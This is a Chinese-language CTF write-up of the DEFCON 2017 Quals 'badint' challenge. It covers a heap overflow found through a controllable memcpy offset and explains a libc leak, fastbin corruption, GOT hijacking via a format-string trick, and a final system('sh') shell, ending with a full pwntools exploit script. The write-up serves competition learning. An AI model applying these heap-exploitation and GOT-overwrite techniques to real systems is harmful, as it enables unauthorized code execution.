---
title: '[DEFCON CTF 2017 Quals] badint'
author: bruce30262
tags:
  - pwn
  - heap
  - heap overflow
  - GOT hijacking
  - fastbin corruption
  - fastbin
  - DEFCON CTF 2017
categories:
  - write-ups
date: 2017-05-04 00:44:00
---
## Info  
> Category: Potent Pwnables
> Author: bruce30262 @ BambooFox  
> 這題是從中間接下去做的，感謝隊友先提供 idb 與 crash input 

## Analyzing
64 bit ELF, Partial RELRO, 有開DEP,  沒 canary & PIE. **題目沒有提供 libc。** 

這是一個 C++ 程式，程式會要使用者輸入一些資料，之後會把這些資料存在 heap 上:

```
$ ./badint 
SEQ #: 0
Offset: 0
Data: AAAAAAA
LSF Yes/No: Yes
RX PDU [0] [len=4]
Assembled [seq: 0]: aaaaaa0a

SEQ #: 
```
其中我們 data 是輸入 `AAAA`，但是程式會將其轉成 `0xaaaa`。

之後根據隊友 **Shao-Chuan Lee** 提供的 crash input 進行動態分析:

```
SEQ #: 1
Offset: 0
Data: 0000000000000000000000000000000000000000000000000000000000000
LSF Yes/No: Yes
RX PDU [1] [len=31]
Assembled [seq: 1]: 00000000000000000000000000000000000000000000000000000000000000

SEQ #: 1
Offset: 0
Data: 111111111111111111111111111111111111111
LSF Yes/No: Yes
RX PDU [1] [len=20]
Assembled [seq: 1]: 1111111111111111111111111111111111111101

SEQ #: 1
Offset: 18
Data: 22222222222222222222222
LSF Yes/No: Yes
RX PDU [1] [len=12]
Assembled [seq: 1]: 000000000000000022222202

*** Error in `./badint': free(): invalid next size (fast): 0x000000000224a0c0 ***
```

看起來是因為 heap overflow 的關係導致 `free()` 在檢查 nextsize 時發現錯誤，直接 abort 程式。經分析後發現漏洞發生在以下程式碼:

```c
 len = get_len(cur_obj);
 data = get_data(cur_obj);
 offset = get_offset(cur_obj);
 memcpy(new_buf + offset, data, len); // <-- 這裡
```

程式在複製 data 進 heap buffer 時，採用 `memcpy(new_buf + offset, data, len)` 這樣的形式進行複製。因為 `offet` 我們可控的關係，因此我們可以指定複製的起點，進而觸發 heap overflow 漏洞。

## Exploit
首先來 leak address 吧。透過以下操作，我們可以 leak 出 libc 的 address:

```
$ ./badint 
SEQ #: 1
Offset: 8
Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
LSF Yes/No: Yes
RX PDU [1] [len=144]
Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

SEQ #:
```

我們將 offset 設定為 8，之後程式會將 data 複製進 `heap_buf+8`。其中，`heap_buf` 為一個被重新 allocate 的 unsortbin chunk，因此其 `fd` 跟 `bk` 均會包含 libc address ( 實際上為 `main_arena+88` )。此時我們將 data 複製進 `heap_buf` 時，只有 `bk` 會被蓋掉，因此之後程式印出 assebled 的 data 時，會將 `fd` 的內容給 leak 出來，我們就拿到了 libc 的 address。

之後要來想辦法控制程式流程。這裡我是利用 fastbin corruption 搭配 GOT hijacking 來達到這件事。首先我們想辦法排出類似下面的 heap layout:
```
gdb-peda$ hip
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0xc26cc0 --> 0x0
(0x40)     fastbin[2]: 0xc26c80 --> 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0xc26c20 --> 0x0   
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0xc26f10 (size : 0x1c0f0) 
       last_remainder: 0xc26e00 (size : 0x50) 
            unsortbin: 0x0
gdb-peda$ 
```

強大的 [angelheap](https://github.com/scwuaptx/Pwngdb/tree/master/angelheap) 告訴我們在 fastbin[2] (size = 0x40) 與 fastbin[4] (size = 0x60) 各有一個 freed chunk。我們首先 allocate fastbin[4] 裡頭的 chunk，並將 data 複製進裡面，offset 設成 `0x60`。這麼一來，`0xc26c20` + `0x60` = `0xc62c80` = chunk @ fastbin[2]，我們就可以控制到 fastbin[2] 裡頭的 chunk 的 data。我們主要的目的是要將其 `fd` 改掉，指向 GOT :
```
gdb-peda$ got
State of the GOT table

RELRO: Partial

[1] printf@GLIBC_2.2.5 -> 0x00007ffff72c7800
[2] __gmon_start__ -> 0x0000000000400ab6
[3] puts@GLIBC_2.2.5 -> 0x0000000000400ac6
[4] _Znam@GLIBCXX_3.4 -> 0x0000000000400ad6
[5] _ZdlPv@GLIBCXX_3.4 -> 0x0000000000400ae6
[6] setvbuf@GLIBC_2.2.5 -> 0x00007ffff72e1e70
..................
```
我們可以看到，一個 non-PIE 的 x64 ELF 的 GOT 裡頭，有許多開頭為 `0x40` 的 address。如果我們將 memory layout 進行偏移:
```
gdb-peda$ x/30gx 0x604042
0x604042 <setvbuf@got.plt+2>:   0x0b0600007ffff72e      0x2740000000000040 <-- here
0x604052 <__libc_start_main@got.plt+2>: 0xfad000007ffff729      0x0b3600007ffff72d
0x604062 <strlen@got.plt+2>:    0x0b46000000000040      0x73c0000000000040 <-- here
0x604072 <signal@got.plt+2>:    0x0b6600007ffff72a      0xd650000000000040 <-- here
0x604082 <alarm@got.plt+2>:     0x0b8600007ffff733      0x0b96000000000040 <-- here
```
我們會發現到有許多地方是可以拿來當作假的 fastbin[2] chunk (size = 0x40) 來用的。因此，如果我們將 fastbin[2] 裡面的 `chunk->fd` 寫成 `0x604042` 的話:
```
gdb-peda$ hip
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x1da3cc0 --> 0x0
(0x40)     fastbin[2]: 0x1da3c80 --> 0x604042 (size error (0xc740000000000040)) --> 0x9ad000007f5e059a (invaild memory)
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x1da3c20 --> 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x1da3f80 (size : 0x1c080) 
       last_remainder: 0x1da3e00 (size : 0x50) 
            unsortbin: 0x0
```
我們可以發現到， fastbin[2] 裡頭多出了一個假的 fastbin[2] chunk `0x604042`。之後我們就可以把這個 fake chunk 拿來用，將 data 複製進這個 chunk 裡面，做 GOT hijacking。

> malloc.c 裡面針對 fastbin 的檢查很殘廢。對於 malloc 一個 fastbin[2] 而言，只要其 size (unsigned int, 4 個 byte) 為 0x40 ~ 0x4f，就可以通過 malloc() 的檢查，allocate 成功。

雖然目前可以 hijack GOT 了，但是我們還不知道 libc 的版本為何。這題不好 leak address，因為我們參數幾乎都是不可控的狀態 (頂多就是可以控制 buffer 內容，但是無法控制 buffer 位址)。這邊最後想到了一個有趣的解法: **利用 format string**。

我們可以將 `atol()` hijack 成 `printf()`，之後程式在呼叫 `atol(input)`的時候，實際上就是在執行 `printf(input)`，我們就可以透過 format string 漏洞 leak 任意位址。

另外再分享一個小技巧，就是我們在蓋 `atol()` 的 GOT 時，會無可避免地蓋到 `fgets()` 的 GOT。此時在不知道 `fgets()` 的 function address 的情況下，我們可以將 `fgets()` 的 GOT 蓋成  `fgets()` 被 resolve 之前的 code address:
```
gdb-peda$ got
State of the GOT table

RELRO: Partial
...................
[9] fgets@GLIBC_2.2.5 -> 0x0000000000400b26 <-- a fixed address
```
這麼一來程式之後就會重新 bind 一次 `fgets()` 的 address，我們就可以繼續利用 `fgets()` 讀 input 了。

利用 format string leak 出各個 GOT entry 之後，順利的在 [libcdb.com](http://libcdb.com/) 找到了遠端 libc 的版本。之後我們就可以將 `atol()` hijack 成 `system()`，然後輸入 "sh" 字串，呼叫 `system("sh")` 拿 shell。

```python exp_bad.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"
PORT = 21813
ELF_PATH = "./badint"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC_PATH = "./libc-2.19_15.so"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object
libc = ELF(LIBC_PATH)

def add_data(seq, off, data, lsf):
    r.sendlineafter("SEQ #:", str(seq))
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Data: ", data)
    r.sendlineafter("Yes/No: ", lsf)

def convert(num):
    ret = ""
    while num != 0:
        now = num & 0xff
        num >>= 8
        ret = ret + '{:02x}'.format(now)
    return ret.ljust(16, "0")

if __name__ == "__main__":
    
    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    add_data(1, 8, "1"*0x90*2, 'Yes')
    r.recvuntil("Assembled [seq: 1]: ")
    # leak libc address
    addr = 0
    for i in xrange(6):
        addr |= ((int(r.recv(2), 16)) << (i*8))
    
    log.success("addr: " +hex(addr))
    # libc.address = addr - 0x3c3b78 # local
    libc.address = addr - 0x3be7b8 # remote
    log.success("libc_base: " +hex(libc.address))
    # gdb.attach(r, gdbscript=open('./ggg', 'r'))
    # arrange heap
    add_data(2, 0, "2"*0xb0*2, 'Yes')
    add_data(2, 0, "3"*0x58*2, 'Yes')
    add_data(2, 0, "4"*0x38*2, 'Yes')
    # overwrite fastbin->fd ( in size 0x40 )
    payload = convert(0x41)
    payload += convert(0x604042)
    payload += convert(0) * 6
    payload += convert(0x31)
    payload = payload.ljust(0x58*2, '0')
    add_data(2, 0x60-0x8, payload, 'Yes')
    # now fastbin (size=0x40) has fake chunk @ got
    # allocate the fake chunk
    # overwrite got
    payload = "6"*12 # libc_start_main
    payload += convert(0x400b26) # resolve fgets
    payload += convert(0x400b36) # resolve strlen
    payload += convert(libc.symbols['system']) # hijack atol
    #payload += convert(elf.plt['printf']) # use format string to leak libc info
    payload = payload.ljust(110, '0')
    add_data(3, 8, payload, 'No')
    
    # hijack atol, send "sh" to get shell
    r.sendlineafter("SEQ #:", "sh")
    log.success("get shell!: ")
    r.interactive()

    # for exploiting format string & leak libc info
    """
    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['fgets'])
    r.sendlineafter("SEQ #:", payload)
    r.recv(1)
    print "fgets:", hex(u64(r.recv(6).ljust(8, '\x00')))
    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['puts'])
    r.sendlineafter("Offset:", payload)
    r.recv(1)
    print "puts:", hex(u64(r.recv(6).ljust(8, '\x00')))
    """
```

flag: `All ints are not the same... A239... Some can be bad ints!`
